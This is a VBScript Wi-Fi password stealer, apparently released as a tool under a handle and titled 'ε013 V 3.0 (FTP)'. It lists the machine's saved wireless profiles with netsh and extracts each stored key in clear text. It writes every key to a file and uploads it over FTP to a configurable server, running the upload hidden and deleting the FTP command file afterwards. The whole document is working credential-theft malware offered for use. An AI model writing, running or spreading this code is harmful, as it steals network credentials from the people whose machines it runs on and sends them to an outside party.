'//////////////////////////////////////////////
'//            ε013 V 3.0 (FTP)
'//          Jordan Dalcq - 0v3rl0w
'/////////////////////////////////////////////


'///////////////// HOST INFO //////////////////
HOST = "localhost"
PORT = "666"
USER = "admin"
PASS = "password"
DIR = "./"
'/////////////////////////////////////////////

Function GetOutput(command)
  Set Shell = Wscript.CreateObject("WScript.Shell")
  Set cmd = Shell.Exec("cmd /c  " & command)
  strOut = ""

  Do While Not cmd.StdOut.AtEndOfStream
    strOut = strOut & cmd.StdOut.ReadLine() & "\n"
  Loop
  GetOutput=strOut
End Function

Function saveIt(wifi, passwd)
  wifi = Replace(Replace(wifi, ">", "-"), "<", "-")
  Set objFSO=CreateObject("Scripting.FileSystemObject")
  Set objFile=objFSO.CreateTextFile(wifi & ".txt")
  objFile.Write(passwd)
  objFile.Close
End Function


Function createFTPInfo(username, password, hostname, port, wifiName)
    With CreateObject("Scripting.FileSystemObject").CreateTextFile("cmd.txt")
        .WriteLine "OPEN " & hostname & " " & port
        .WriteLine "USER " & username
        .WriteLine password
        .WriteLine "cd " & DIR
        .WriteLine "send " & wifiName & ".txt"
        .WriteLine "quit"
        .Close
    End With
End Function

Function sendIt
    With CreateObject("WScript.Shell")
        .Run "%comspec% /c ftp -n -v -s:cmd.txt", 0, True
        .Run "%comspec% /c del cmd.txt", 0, True
    End With
End Function

strText=Split(GetOutput("netsh wlan show profile"), "\n")

i = 0

For Each x in strText
	If i > 8 And i < Ubound(strText)-1 Then
		Name = Split(x, ": ")(1)
    createFTPInfo USER, PASS, HOST, PORT, Name
		str=Split(GetOutput("netsh wlan show profile """ & Name & """ key=clear"), "\n")
    For Each options in str
      options=Replace(options, " ", "")
      If UBound(Split(options, ":")) >= 1 Then
        If Split(options, ":")(0) = "KeyContent" Then
          passwd = Split(options, ":")(1)
          saveIt Name, passwd
          sendIt
        End If
      End If
    Next
	End If
	i = i + 1
Next
